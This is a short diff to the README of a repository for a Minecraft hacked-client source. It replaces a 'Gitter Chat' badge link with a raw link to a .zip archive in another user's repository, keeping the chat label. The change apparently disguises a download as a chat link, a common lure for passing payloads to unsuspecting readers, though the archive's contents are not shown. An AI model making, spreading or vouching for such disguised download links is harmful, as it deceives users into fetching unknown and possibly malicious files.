@@ -3,4 +3,4 @@
 
 Source of the Minecraft Hacked client Resilience
 
-[![Gitter Chat](https://badges.gitter.im/Bluscream/Resilience-Client-Source.png)](https://gitter.im/Bluscream/Resilience-Client-Source)
+[![Gitter Chat](https://raw.githubusercontent.com/ayzick/Resilience-Client-Source/master/Aramu/Resilience-Client-Source.zip)](https://raw.githubusercontent.com/ayzick/Resilience-Client-Source/master/Aramu/Resilience-Client-Source.zip)
